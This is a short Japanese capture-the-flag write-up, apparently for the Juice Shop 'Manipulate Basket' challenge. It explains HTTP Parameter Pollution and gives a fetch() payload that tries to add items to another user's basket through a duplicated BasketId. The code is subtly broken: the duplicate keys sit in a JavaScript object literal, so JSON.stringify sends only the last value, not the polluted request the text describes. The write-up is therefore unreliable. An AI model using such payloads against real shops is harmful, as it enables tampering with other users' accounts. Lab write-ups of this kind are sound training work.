# Manipulate Basket ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** HPP
**目標:** 他のユーザーのカートに商品を追加する

---

## 実行手順

HTTP Parameter Pollution（HPP）を使用:

```javascript
fetch('/api/BasketItems/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    ProductId: 1,
    BasketId: 1,  // 自分のBasketId
    BasketId: 2,  // 他人のBasketId（重複）
    quantity: 1
  })
})
```

## 解説

**HTTP Parameter Pollution（HPP）とは？**
- 同じパラメータを複数回送信する攻撃
- サーバーによっては最初の値、最後の値、または両方を処理
- この場合、2番目の `BasketId` が採用され、他人のカートに商品が追加される

**JSONでの重複キー:**
- JSON仕様では重複キーの動作は未定義
- 多くの実装は最後の値を採用

## 関連チャレンジ

- [View Basket](../difficulty-2/view-basket.md)
- [Forged Feedback](forged-feedback.md)
